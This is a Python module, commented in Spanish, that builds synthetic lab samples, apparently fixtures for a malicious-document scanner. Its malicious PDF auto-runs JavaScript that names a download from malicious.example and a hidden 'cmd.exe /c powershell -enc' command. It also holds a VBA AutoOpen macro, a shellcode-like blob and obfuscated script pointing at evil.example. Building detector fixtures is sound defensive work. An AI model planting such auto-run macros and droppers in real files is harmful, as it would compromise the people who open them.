"""Generadores de muestras de laboratorio (benignas y sintéticas)."""

from __future__ import annotations

import io
import zipfile
import zlib


def build_pdf(objects: list[bytes]) -> bytes:
    """PDF 1.7 mínimo pero válido (xref calculado)."""
    out = bytearray(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n")
    offsets: list[int] = []
    for index, body in enumerate(objects, start=1):
        offsets.append(len(out))
        out += f"{index} 0 obj\n".encode() + body + b"\nendobj\n"
    xref_pos = len(out)
    out += f"xref\n0 {len(objects) + 1}\n".encode()
    out += b"0000000000 65535 f \n"
    for offset in offsets:
        out += f"{offset:010d} 00000 n \n".encode()
    out += (
        f"trailer\n<< /Size {len(objects) + 1} /Root 1 0 R >>\n"
        f"startxref\n{xref_pos}\n%%EOF\n"
    ).encode()
    return bytes(out)


def benign_pdf() -> bytes:
    return build_pdf(
        [
            b"<< /Type /Catalog /Pages 2 0 R >>",
            b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
            b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>",
            b"<< /Length 44 >>\nstream\nBT /F1 12 Tf 72 720 Td (Factura de prueba) Tj ET\nendstream",
        ]
    )


def malicious_pdf(*, with_embedded: bool = False) -> bytes:
    js = (
        b"var u = 'http://malicious.example/payload.exe';\n"
        b"var sh = new ActiveXObject('WScript.Shell');\n"
        b"var http = new ActiveXObject('MSXML2.XMLHTTP');\n"
        b"var st = new ActiveXObject('ADODB.Stream');\n"
        b"var s = String.fromCharCode(99,109,100,46,101,120,101);\n"
        b"sh.Run('cmd.exe /c powershell -enc SQBFAFgA');\n"
    )
    # Dentro de una cadena literal PDF, '(' y ')' deben ir escapados; de lo
    # contrario el parser (correctamente) corta el objeto antes de tiempo.
    pdf_string = js.replace(b"\\", b"\\\\").replace(b"(", b"\\(").replace(b")", b"\\)")
    objects: list[bytes] = [
        b"<< /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R >>",
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>",
        b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>",
        b"<< /Type /Action /S /JavaScript /JS (" + pdf_string + b") >>",
    ]
    if with_embedded:
        docm = docm_bytes()
        compressed = zlib.compress(docm, 9)
        objects.append(
            b"<< /Type /Filespec /F (anexo.docm) /EF << /F 7 0 R >> >>"
        )
        objects.append(
            b"<< /Type /EmbeddedFile /Filter /FlateDecode /Length "
            + str(len(compressed)).encode()
            + b" >>\nstream\n"
            + compressed
            + b"\nendstream"
        )
    return build_pdf(objects)


def docm_bytes() -> bytes:
    buffer = io.BytesIO()
    vba = (
        b"Attribute VB_Name = \"Module1\"\r\n"
        b"Sub AutoOpen()\r\n"
        b"  Shell \"cmd.exe /c powershell -w hidden\"\r\n"
        b"  CreateObject(\"WScript.Shell\").Run \"calc.exe\"\r\n"
        b"End Sub\r\n"
    )
    fixed = (2026, 1, 1, 0, 0, 0)  # ZIP determinista: mismo hash en cada ejecución
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as zf:
        for name, content in (
            ("[Content_Types].xml", "<Types/>"),
            ("word/document.xml", "<w:document/>"),
            ("word/vbaProject.bin", vba),
            ("word/_rels/document.xml.rels", "<Relationships/>"),
        ):
            info = zipfile.ZipInfo(name, date_time=fixed)
            info.compress_type = zipfile.ZIP_DEFLATED
            zf.writestr(info, content)
    return buffer.getvalue()


def shellcode_blob() -> bytes:
    """Blob x86 con prologues reconocibles (no ejecutable como muestra real)."""
    return (
        b"\x55\x8b\xec"  # push ebp; mov ebp, esp
        b"\x31\xc0"  # xor eax, eax
        b"\x64\xa1\x30\x00\x00\x00"  # mov eax, fs:[0x30]
        b"\xfc\xe8\x00\x00\x00\x00"  # cld; call $+5
        b"\xcd\x80"  # int 0x80
        b"\x90" * 32
    )


def packed_js() -> bytes:
    """JS ofuscado con escapes y String.fromCharCode (sin ejecución)."""
    return (
        b"var a = unescape('%68%74%74%70%3a%2f%2fevil%2eexample%2fx');"
        b"var b = String.fromCharCode(87,83,99,114,105,112,116,46,83,104,101,108,108);"
        b"var c = '\\x41\\x42\\x43';"
    )
